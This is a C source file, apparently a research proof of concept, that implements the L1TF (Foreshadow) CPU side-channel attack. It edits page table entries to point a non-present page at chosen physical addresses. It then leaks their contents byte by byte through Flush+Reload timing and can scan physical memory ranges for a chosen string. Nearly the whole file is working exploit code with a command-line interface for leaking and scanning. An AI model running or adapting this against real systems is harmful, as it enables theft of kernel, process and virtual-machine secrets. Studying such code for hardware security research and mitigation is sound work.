#define _GNU_SOURCE
#include "l1tf.h"
#include "constants.h"
#include "flush_and_reload.h"
#include "secret.h"
#include "statistics.h"
#include <asm-generic/errno-base.h>
#include <bits/time.h>
#include <bits/types/siginfo_t.h>
#include <err.h>
#include <errno.h>
#include <getopt.h>
#include <stdbool.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <sys/utsname.h>
#include <time.h>
#include <ucontext.h>
#include <unistd.h>

#pragma GCC diagnostic push
#pragma GCC diagnostic ignored "-Wunused-function"
#include "ptedit_header.h"
#pragma GCC diagnostic pop

#include <assert.h>

#define THRESHOLD 150

uint8_t l1tf_full(void *leak_addr, reload_buffer_t reload_buffer) {
  ssize_t high, low;

  do {
    flush(AMOUNT_OF_OPTIONS_IN_NIBBLE, PAGE_SIZE, (void *)reload_buffer[0]);
    asm_l1tf_leak_high_nibble(leak_addr, reload_buffer);
    high = reload(AMOUNT_OF_OPTIONS_IN_NIBBLE, PAGE_SIZE, (void *)reload_buffer[0], THRESHOLD);
  } while (high == -1);

  do {
    flush(AMOUNT_OF_OPTIONS_IN_NIBBLE, PAGE_SIZE, (void *)reload_buffer[0]);
    asm_l1tf_leak_low_nibble(leak_addr, &reload_buffer[0]);
    low = reload(AMOUNT_OF_OPTIONS_IN_NIBBLE, PAGE_SIZE, (void *)reload_buffer[0], THRESHOLD);
  } while (low == -1);

  return ((high & 0x0f) << 4) | (low & 0x0f);
}

// Super fast checking of the existance of a byte at a certain address.
// Only requires a single FLUSH+RELOAD of a single address (instead
// of 32 or 256). Useful to quickly scan physical memory, assuming we know
// that a certain byte appears.
bool l1tf_check(void *leak_addr, full_reload_buffer_t reload_buffer, uint8_t check) {
  clflush(reload_buffer[check]);
  mfence();

  asm_l1tf_leak_full(leak_addr, reload_buffer);

  size_t time = access_time(reload_buffer[check]);
  return time < THRESHOLD;
}

bool l1tf_check_2(void *leak_addr, full_reload_buffer_t reload_buffer, uint8_t check[2]) {
  clflush(reload_buffer[check[1]]);
  mfence();

  uint16_t half_word = *(uint16_t *)check;
  asm_l1tf_leak_full_2_byte_mask(leak_addr, reload_buffer, half_word & 0x00ff);

  size_t time = access_time(reload_buffer[check[1]]);
  return time < THRESHOLD;
}

bool l1tf_check_4(void *leak_addr, full_reload_buffer_t reload_buffer, uint8_t check[4]) {
  clflush(reload_buffer[check[3]]);
  mfence();

  uint32_t word = *(uint32_t *)check;
  asm_l1tf_leak_full_4_byte_mask(leak_addr, reload_buffer, word & 0x00ffffff);

  size_t time = access_time(reload_buffer[check[3]]);
  return time < THRESHOLD;
}

leak_addr_t l1tf_leak_buffer_create(void) {
  void *leak_ptr =
      mmap(NULL, PAGE_SIZE, PROT_WRITE | PROT_READ, MAP_PRIVATE | MAP_ANONYMOUS | MAP_POPULATE, -1, 0);
  assert(leak_ptr != MAP_FAILED);
  assert(!mprotect(leak_ptr, PAGE_SIZE, PROT_NONE));

  leak_addr_t leak;
  leak.leak = leak_ptr;

  ptedit_entry_t entry = ptedit_resolve(leak.leak, 0);
  leak.pte_ptr = entry.pte_ptr;
  leak.original_pfn = ptedit_get_pfn(*leak.pte_ptr);

  *leak.pte_ptr &= ~(1ull << PTEDIT_PAGE_BIT_PRESENT);
  ptedit_invalidate_tlb(leak.leak);

  return leak;
}

void l1tf_leak_buffer_modify(leak_addr_t *leak, void *ptr) {
  size_t pfn = (((uintptr_t)ptr) & ~(0xfff)) >> 0xc;
  size_t current_pte = *(leak->pte_ptr);
  *(leak->pte_ptr) = ptedit_set_pfn(current_pte, pfn);
}

void l1tf_leak_buffer_free(leak_addr_t *leak) {
  // Restore leak PFN before munmapping the buffer
  ptedit_pte_set_pfn(leak->leak, 0, leak->original_pfn);
  assert(!munmap(leak->leak, PAGE_SIZE));
}

void initialize_pteditor_lib(void) {
  fprintf(stderr, "Initializing PTEdit...\r");
  assert(!ptedit_init());
  fprintf(stderr, "Initialized PTEdit! Mapping physical memory to user space...\n");
  ptedit_use_implementation(PTEDIT_IMPL_USER);
}

reload_buffer_t *l1tf_reload_buffer_create(void) {
  reload_buffer_t *reload_buffer = mmap(NULL, sizeof(reload_buffer_t), PROT_WRITE | PROT_READ,
                                        MAP_PRIVATE | MAP_ANONYMOUS | MAP_POPULATE, -1, 0);
  assert(reload_buffer != MAP_FAILED);
  return reload_buffer;
}

void l1tf_reload_buffer_free(reload_buffer_t *reload_buffer) {
  assert(!munmap(reload_buffer, sizeof(reload_buffer_t)));
}

typedef struct {
  bool *ptr;
  size_t mmap_size;
  size_t amount;
  int fd;
} mds_offenders_t;

void free_mds_offenders(mds_offenders_t mds) {
  munmap(mds.ptr, mds.mmap_size);
  close(mds.fd);
}

// There are some offsets in a page that always leak garbage
// values, regardless of the page that we're actually leaking.
// It looks like MDS but it is also different from MDS, not
// sure what it is exactly.
// This function tries to detect those bytes by doing l1tf
// on a PFN that for sure doesn't exist:
//   physical address 0xfffffffffffff000, or the
//   page at the end of 16 EiB of physical memory
// It will return the amount of bytes that it detected, and
// offsets themselves so they can be filtered out during the
// L1tf leaking part.
mds_offenders_t detect_mds_bytes_in_page(void) {
  // Because this operation takes quite some time, we want to
  // cache the results to disk.
  mds_offenders_t offenders = {0};
  offenders.mmap_size = ((PAGE_SIZE + 1) * sizeof(bool));

  offenders.fd = open(".mds.cache", O_RDWR | O_CREAT, S_IRUSR | S_IWUSR);
  if (offenders.fd < 0) {
    fprintf(stderr,
            "Failed to open the file .mds.cache: %s. Continuing without the "
            "cache\n",
            strerror(errno));
    offenders.ptr =
        mmap(NULL, offenders.mmap_size, PROT_WRITE | PROT_READ, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
  } else {
    assert(!ftruncate(offenders.fd, offenders.mmap_size));
    offenders.ptr = mmap(NULL, offenders.mmap_size, PROT_WRITE | PROT_READ, MAP_SHARED, offenders.fd, 0);
  }
  assert(offenders.ptr != MAP_FAILED);

  // Check if we calculated the MDS bytes before on this machine
  if (offenders.ptr[PAGE_SIZE]) {
    for (size_t i = 0; i < PAGE_SIZE; ++i) {
      if (offenders.ptr[i]) {
        offenders.amount++;
      }
    }
    fprintf(stderr, "Loaded MDS offenders from cache!\n");
    return offenders;
  }
  fprintf(stderr, "There is no MDS offender cache, building one (may take some time)...\n");

  reload_buffer_t *reload_buffer = l1tf_reload_buffer_create();

  leak_addr_t leak = l1tf_leak_buffer_create();
  const uintptr_t phys_addr = 0xfffffffffffff000;
  l1tf_leak_buffer_modify(&leak, (void *)phys_addr);

  size_t values[PAGE_SIZE] = {0};
  const size_t nr_of_probes = 5000;

  // Do l1tf on the entire page, and track which bytes show
  // spurious behavior.
  for (size_t probe = 0; probe < nr_of_probes; ++probe) {
    if (probe % 100 == 0) {
      fprintf(stderr, "Probe set %ld/%ld...\r", probe, nr_of_probes);
    }
    for (size_t i = 0; i < PAGE_SIZE; ++i) {
      void *leak_addr = (char *)leak.leak + i;
      uint8_t leaked_byte = l1tf_full(leak_addr, *reload_buffer);
      values[i] += leaked_byte;
    }
  }

  for (size_t i = 0; i < PAGE_SIZE; ++i) {
    if (values[i]) {
      offenders.ptr[i] = true;
      offenders.amount++;
    }
  }

  offenders.ptr[PAGE_SIZE] = true;

  l1tf_leak_buffer_free(&leak);
  l1tf_reload_buffer_free(reload_buffer);
  return offenders;
}

// If we're printing all characters AS IS, then we might modify things like
// the current cursor position of the terminal.
void escape_ascii(char in, char out[3]) {
  switch (in) {
  case 0:
  case 1:
  case 2:
  case 3:
  case 4:
  case 5:
  case 6:
  case 14:
  case 15:
  case 16:
  case 17:
  case 18:
  case 19:
  case 20:
  case 21:
  case 22:
  case 23:
  case 24:
  case 25:
  case 26:
  case 27:
  case 28:
  case 29:
  case 30:
  case 31:
  case 127:
    out[0] = ' ';
    break;
  case 7:
    out[0] = '\\';
    out[1] = 'a';
    break;
  case 8:
    out[0] = '\\';
    out[1] = 'b';
    break;
  case 9:
    out[0] = '\\';
    out[1] = 't';
    break;
  case 10:
    out[0] = '\\';
    out[1] = 'n';
    break;
  case 11:
    out[0] = '\\';
    out[1] = 'v';
    break;
  case 12:
    out[0] = '\\';
    out[1] = 'f';
    break;
  case 13:
    out[0] = '\\';
    out[1] = 'r';
    break;
  default:
    out[0] = in;
    break;
  }
}

void l1tf_do_leak(const uintptr_t phys_addr, const size_t length) {
  initialize_pteditor_lib();

  fprintf(stderr, "Attempting to leak %ld bytes from %p...\n", length, (void *)phys_addr);
  fprintf(stderr, "Request leak and reload buffers\n");

  reload_buffer_t *reload_buffer = l1tf_reload_buffer_create();

  leak_addr_t leak = l1tf_leak_buffer_create();
  l1tf_leak_buffer_modify(&leak, (void *)phys_addr);

  fprintf(stderr, "Clear the reload buffer at %p\n", (void *)reload_buffer);
  memset(reload_buffer, 0, sizeof(reload_buffer_t));

  const size_t results_size = sizeof(size_t[2 * length][16]);
  size_t(*results)[16] = malloc(results_size);
  memset(results, 0, results_size);

  fprintf(stderr, "Detecting MDS offenders...\n");
  mds_offenders_t mds_offenders = detect_mds_bytes_in_page();
  printf("-> Amount of offending bytes: %ld\n", mds_offenders.amount);

  printf("Continously leaking %ld bytes from physcial address 0x%lx:\n", length, phys_addr);
  size_t start = (phys_addr & 0xfff);
  assert(start + length < 0xfff);

  size_t *assembled_results = malloc(length * sizeof(size_t));
  const int bytes_per_line = 16;

  for (int iter = 1; iter <= 1000; ++iter) {
    for (int x = 0; x < 10; ++x) {
      for (size_t i = 0, j = start; j < start + length; j += 1, i += 2) {
        void *leak_addr = (char *)leak.leak + j;
        size_t high =
            l1tf_do_leak_nibblewise_prober(leak_addr, reload_buffer, asm_l1tf_leak_high_nibble) & 0xf;
        size_t low = l1tf_do_leak_nibblewise_prober(leak_addr, reload_buffer, asm_l1tf_leak_low_nibble) & 0xf;

        // Count the number of times each result has occured
        results[i][high]++;
        results[i + 1][low]++;
      }
    }

    for (size_t i = 0; i < 2 * length; i += 2) {
      size_t high = maximum(15, &results[i][1]) + 1;
      if (results[i][high] < 2) {
        high = 0;
      }

      size_t low = maximum(15, &results[i + 1][1]) + 1;
      if (results[i + 1][low] < 2) {
        low = 0;
      }

      size_t result = ((high & 0x0f) << 4) | (low & 0x0f);
      assembled_results[i / 2] = result;
      printf("%02lx ", result);

      if (i % (2 * bytes_per_line) == ((2 * bytes_per_line) - 2)) {
        // We would like to compare the results to the ground truth, to see the accuracy
        printf("\t( ");
        size_t line = i / (2 * bytes_per_line);
        for (size_t byte = 0; byte < bytes_per_line; ++byte) {
          size_t idx = byte + (line * bytes_per_line);
          char secret_byte = SECRET_DATA[idx];
          printf("%c%c ", ((assembled_results[idx] & 0xf0) == (secret_byte & 0xf0) ? '.' : 'X'),
                 ((assembled_results[idx] & 0xf) == (secret_byte & 0xf) ? '.' : 'X'));
        }
        printf(")");

        printf("\n\r");
      }
    }

    // Restore cursor position
    printf("\033[%ldA\r", length / bytes_per_line);
  }

  free(assembled_results);
  free(results);

  l1tf_leak_buffer_free(&leak);
  l1tf_reload_buffer_free(reload_buffer);
  free_mds_offenders(mds_offenders);

  ptedit_cleanup();
}

void *l1tf_scan_physical_memory(scan_opts_t scan_opts, size_t needle_size, char needle[needle_size],
                                full_reload_buffer_t reload_buffer, leak_addr_t leak) {
  assert(needle_size > 0);
  assert(needle_size < scan_opts.stride);
  assert(needle_size % 2 == 0);
  assert((scan_opts.start & 0xfff) + needle_size < PAGE_SIZE);

  reload_buffer_t nibble_reload_buffer = {0};
  size_t attempt = 1;

  if (needle_size % 4 == 0) {
    while (true) {
      for (uintptr_t ptr = scan_opts.start, i = 0; ptr < scan_opts.end; ptr += scan_opts.stride, ++i) {
        if (i % 100000 == 0) {
          fprintf(stderr, "run %ld: %.2f%%\r", attempt,
                  ((double)(ptr - scan_opts.start) / (double)(scan_opts.end - scan_opts.start)) *
                      (double)100);
        }
        l1tf_leak_buffer_modify(&leak, (void *)ptr);

        for (size_t idx = 0; idx < needle_size; idx += 4) {
          uint8_t *leak_ptr = &((uint8_t *)leak.leak)[idx + (ptr & 0xfff)];
          if (l1tf_check_4(leak_ptr, reload_buffer, (uint8_t *)needle)) {
            uint8_t leaked_data[32] = {0};
            for (size_t data_idx = 0; data_idx < 32; ++data_idx) {
              leaked_data[data_idx] = l1tf_full(&leak_ptr[data_idx], nibble_reload_buffer) & 0xff;
            }
            printf("\n%p\t", (void *)ptr);
            for (size_t leaked_data_idx = 0; leaked_data_idx < 32; ++leaked_data_idx) {
              printf("%.2x ", leaked_data[leaked_data_idx]);
            }
            printf("\n");
            fflush(stdout);
          }
        }
      }
      ++attempt;
    }
  } else if (needle_size % 2 == 0) {
    while (true) {
      for (uintptr_t ptr = scan_opts.start, i = 0; ptr < scan_opts.end; ptr += scan_opts.stride, ++i) {
        if (i % 100000 == 0) {
          fprintf(stderr, "run %ld: %.2f%%\r", attempt,
                  ((double)(ptr - scan_opts.start) / (double)(scan_opts.end - scan_opts.start)) *
                      (double)100);
        }
        l1tf_leak_buffer_modify(&leak, (void *)ptr);

        for (size_t idx = 0; idx < needle_size; idx += 2) {
          uint8_t *leak_ptr = &((uint8_t *)leak.leak)[idx + (ptr & 0xfff)];
          if (l1tf_check_2(leak_ptr, reload_buffer, (uint8_t *)needle)) {
            uint8_t leaked_data[32] = {0};
            for (size_t data_idx = 0; data_idx < 32; ++data_idx) {
              leaked_data[data_idx] = l1tf_full(&leak_ptr[data_idx], nibble_reload_buffer) & 0xff;
            }
            // if (leaked_data[6 + idx] == needle[idx] && leaked_data[7 + idx] == needle[idx + 1]) {
            printf("\n%p\t", (void *)ptr);
            for (size_t leaked_data_idx = 0; leaked_data_idx < 32; ++leaked_data_idx) {
              printf("%.2x ", leaked_data[leaked_data_idx]);
            }
            printf("\n");
            fflush(stdout);
            // }
          }
        }
      }
      ++attempt;
    }
  }
  return NULL;
}

size_t l1tf_do_leak_nibblewise_prober(void *leak_addr, reload_buffer_t *reload_buffer,
                                      void (*l1tf_leak_function)(void *, reload_buffer_t)) {
  const size_t nr_of_probes = 25;
  const size_t probe_size = AMOUNT_OF_OPTIONS_IN_NIBBLE * sizeof(size_t);
  size_t *probes = malloc(probe_size);
  memset(probes, 0, probe_size);

  for (size_t probe_nr = 0; probe_nr < nr_of_probes; ++probe_nr) {
    ssize_t nibble = -1;
    size_t attempt = 0;
    do {
      flush(AMOUNT_OF_OPTIONS_IN_NIBBLE, PAGE_SIZE, (void *)reload_buffer[0]);
      l1tf_leak_function(leak_addr, reload_buffer[0]);
      nibble = reload(AMOUNT_OF_OPTIONS_IN_NIBBLE, PAGE_SIZE, (void *)reload_buffer[0], THRESHOLD);
      attempt += 1;
    } while (nibble == -1 && attempt < 250);

    if (nibble != -1) {
      probes[nibble] += 1;
    }
  }

  size_t max = maximum(AMOUNT_OF_OPTIONS_IN_NIBBLE - 1, &probes[1]) + 1;
  if (probes[max] == 0) {
    max = 0;
  }

  free(probes);

  return max;
}

void l1tf_do_leak_nibblewise(const uintptr_t phys_addr, const size_t length) {
  initialize_pteditor_lib();

  fprintf(stderr, "Attempting to leak %ld bytes from %p...\n", length, (void *)phys_addr);
  fprintf(stderr, "Request leak and reload buffers\n");

  reload_buffer_t *reload_buffer = l1tf_reload_buffer_create();

  leak_addr_t leak = l1tf_leak_buffer_create();
  l1tf_leak_buffer_modify(&leak, (void *)phys_addr);

  fprintf(stderr, "Clear the reload buffer at %p\n", (void *)reload_buffer);
  memset(reload_buffer, 0, sizeof(reload_buffer_t));

  const size_t results_size = length * sizeof(uint8_t);
  uint8_t *results = malloc(results_size);
  memset(results, 0, results_size);

  fprintf(stderr, "Detecting MDS offenders...\n");
  mds_offenders_t mds_offenders = detect_mds_bytes_in_page();
  printf("-> Amount of offending bytes: %ld\n", mds_offenders.amount);

  printf("Continously leaking %ld bytes from physcial address 0x%lx:\n", length, phys_addr);
  size_t start = (phys_addr & 0xfff);
  assert(start + length < 0xfff);

  for (int iter = 1; iter <= 10000; ++iter) {
    // while (true) {
    for (size_t i = 0, j = start; j < start + length; j += 1) {
      void *leak_addr = (char *)leak.leak + j;
      size_t high = l1tf_do_leak_nibblewise_prober(leak_addr, reload_buffer, asm_l1tf_leak_high_nibble);
      size_t low = l1tf_do_leak_nibblewise_prober(leak_addr, reload_buffer, asm_l1tf_leak_low_nibble);
      size_t result = ((high & 0x0f) << 4) | (low & 0x0f);
      results[i++] = result;
    }

    //printf("Leaked from %p (%d):\t", (void *)phys_addr, iter);
    for (size_t i = 0; i < length; ++i) {
      printf("%02x ", results[i]);
    }
    printf("\n");
    // }
  }

  free(results);

  l1tf_leak_buffer_free(&leak);
  l1tf_reload_buffer_free(reload_buffer);
  free_mds_offenders(mds_offenders);

  ptedit_cleanup();

  //
  // printf("hellO!");
}

void do_scan(scan_opts_t scan_opts, size_t needle_size, char needle[needle_size]) {
  initialize_pteditor_lib();
  full_reload_buffer_t reload_buffer = {0};
  leak_addr_t leak = l1tf_leak_buffer_create();

  void *phys_addrs = l1tf_scan_physical_memory(scan_opts, needle_size, needle, reload_buffer, leak);
  if (phys_addrs) {
    printf("Found needle at %p\n", phys_addrs);
  } else {
    printf("Did not find the needle in physical memory\n");
  }

  l1tf_leak_buffer_free(&leak);
  ptedit_cleanup();
  return;
}

// If you already know a physical address that you want to leak
int l1tf_main_leak(const int argc, char *argv[argc], void (*leak_func)(uintptr_t, size_t)) {
  // Parse the physcial address and the length from the
  // command line arguments
  uintptr_t phys_addr = -1;
  size_t length = -1;

  static struct option options[] = {
      {"address", required_argument, 0, 'a'},
      {"length", required_argument, 0, 'l'},
  };

  while (true) {
    int option_idx = 0;
    int choice = getopt_long(argc, argv, "a:l:", options, &option_idx);
    if (choice == -1) {
      break;
    }

    char *tail = NULL;
    switch (choice) {
    case 'a':
      phys_addr = strtoull(optarg, &tail, 16);
      if (tail == optarg) {
        fprintf(stderr, "Failed to parse physical address as hexadecimal\n");
        exit(1);
      }
      break;
    case 'l':
      length = strtoull(optarg, &tail, 10);
      if (tail == optarg) {
        fprintf(stderr, "Failed to parse length\n");
        exit(1);
      }
      break;
    }
  }

  // Make sure that both the phys_addr and length are set
  if (phys_addr == (uintptr_t)-1 || length == (size_t)-1) {
    fprintf(stderr,
            "Required arguments of %s subcommand\n"
            "\t-%c, --%s\thexadecimal physical address where you "
            "want to leak from\n"
            "\t-%c, --%s\tamount of bytes you want to leak\n",
            argv[1], options[0].val, options[0].name, options[1].val, options[1].name);
    exit(1);
  }

  leak_func(phys_addr, length);
  exit(0);
}

void *l1tf_spawn_leak_page(void) {
  FILE *rand_file = NULL;
  const char *leak_page_name = "/l1tf_leak_page";

  int fd = shm_open(leak_page_name, O_RDWR | O_CREAT | O_EXCL, S_IRUSR | S_IWUSR);
  if (fd < 0) {
    // It already exists, so let's reuse it!
    if (errno != EEXIST) {
      err(EXIT_FAILURE, "Failed to open leak shm page");
    }

    fd = shm_open(leak_page_name, O_RDONLY, S_IRUSR);
    if (fd < 0) {
      err(EXIT_FAILURE, "Failed to open existing leak shm page");
    }
    printf("Opened existing leak page!\n");
  } else {
    printf("Creating new leak page!\n");
    // Make sure the shared memory region is page in size
    if (ftruncate(fd, PAGE_SIZE) != 0) {
      int e = errno;
      if (shm_unlink(leak_page_name) != 0) {
        err(EXIT_FAILURE, "Failed to unlink %s", leak_page_name);
      };
      errno = e;
      err(EXIT_FAILURE, "Failed to resize shared memory");
    }

    // Open /dev/random
    rand_file = fopen("/dev/random", "r");
    if (rand_file == NULL) {
      int e = errno;
      if (shm_unlink(leak_page_name) != 0) {
        err(EXIT_FAILURE, "Failed to unlink %s", leak_page_name);
      };
      errno = e;
      err(EXIT_FAILURE, "Failed to open /dev/random");
    }
  }

  void *leak_page = NULL;
  if (rand_file != NULL) {
    leak_page = mmap(NULL, PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_POPULATE, fd, 0);
    if (leak_page == (void *)-1) {
      err(EXIT_FAILURE, "mmap of leak page failed");
    }

    // Fill the newly opened page with random data
    if (fread(leak_page, PAGE_SIZE, 1, rand_file) != 1) {
      int e = errno;
      if (shm_unlink(leak_page_name) != 0) {
        err(EXIT_FAILURE, "Failed to unlink %s", leak_page_name);
      };
      errno = e;
      err(EXIT_FAILURE, "Failed to read from /dev/random into leak page");
    };

    if (fclose(rand_file) != 0) {
      err(EXIT_FAILURE, "Failed to close rand_file");
    }
  } else {
    leak_page = mmap(NULL, PAGE_SIZE, PROT_READ, MAP_SHARED | MAP_POPULATE, fd, 0);
    if (leak_page == (void *)-1) {
      err(EXIT_FAILURE, "mmap of leak page failed");
    }
  }
  return leak_page;
}

int l1tf_main_scan(const int argc, char *argv[argc]) {
  uintptr_t start_addr = -1;
  size_t stride = getpagesize();
  size_t length = -1;

  static struct option options[] = {
      {"start", required_argument, 0, 's'},
      {"length", required_argument, 0, 'l'},
      {"stride", required_argument, 0, 't'},
  };
  while (true) {
    int option_idx = 0;
    int choice = getopt_long(argc, argv, "s:l:t:", options, &option_idx);
    if (choice == -1) {
      break;
    }

    char *tail = NULL;
    switch (choice) {
    case 's':
      start_addr = strtoull(optarg, &tail, 16);
      if (tail == optarg) {
        fprintf(stderr, "Failed to parse physical start address as hexadecimal\n");
        exit(1);
      }
      break;
    case 'l':
      length = strtoull(optarg, &tail, 10);
      if (tail == optarg) {
        fprintf(stderr, "Failed to parse scanning range length\n");
        exit(1);
      }
      if (length == 0) {
        fprintf(stderr, "Length cannot be 0\n");
        exit(1);
      }
      break;
    case 't':
      stride = strtoull(optarg, &tail, 10);
      if (tail == optarg) {
        fprintf(stderr, "Failed to parse stride\n");
        exit(1);
      }
    }
  }

  char needle[128] = {0};
  ssize_t needle_size = read(STDIN_FILENO, needle, 128);

  if (start_addr == (uintptr_t)-1 || length == (uintptr_t)-1 || needle_size <= 0) {
    fprintf(stderr,
            "Required arguments of scan subcommand\n"
            "\t-%c, --%s\thexadecimal physcial address where you "
            "want to start scanning from\n"
            "\t-%c, --%s\tthe length of the range that you want to scan in "
            "bytes\n"
            "\t-%c, --%s\tthe stride between every check, defaults to one page\n"
            "Make sure to pass the needle in via stdin\n",
            options[0].val, options[0].name, options[1].val, options[1].name, options[2].val,
            options[2].name);
    exit(1);
  }

  uintptr_t end_addr = start_addr + length;
  assert(end_addr > start_addr);

  fprintf(stderr,
          "Starting to scan for matches in the range 0x%lx-0x%lx for the "
          "string\n\t\"%s\"\n",
          start_addr, end_addr, needle);
  scan_opts_t scan_ops;
  scan_ops.start = start_addr;
  scan_ops.end = end_addr;
  scan_ops.stride = stride;
  do_scan(scan_ops, needle_size, needle);
  return 0;
}

int l1tf_main(int argc, char *argv[argc]) {
  assert(argc > 0);

  if (argc >= 2) {
    if (!strcmp("leak", argv[1])) {
      return l1tf_main_leak(argc, argv, l1tf_do_leak);
    } else if (!strcmp("leak_repeat", argv[1])) {
      return l1tf_main_leak(argc, argv, l1tf_do_leak_nibblewise);
    } else if (!strcmp("scan", argv[1])) {
      return l1tf_main_scan(argc, argv);
    }
  }

  char *name = argv[0];
  fprintf(stderr,
          "Usage\n"
          "\t%s leak\n"
          "\t%s leak_repeat\n"
          "\t%s scan\n",
          name, name, name);
  exit(1);
}
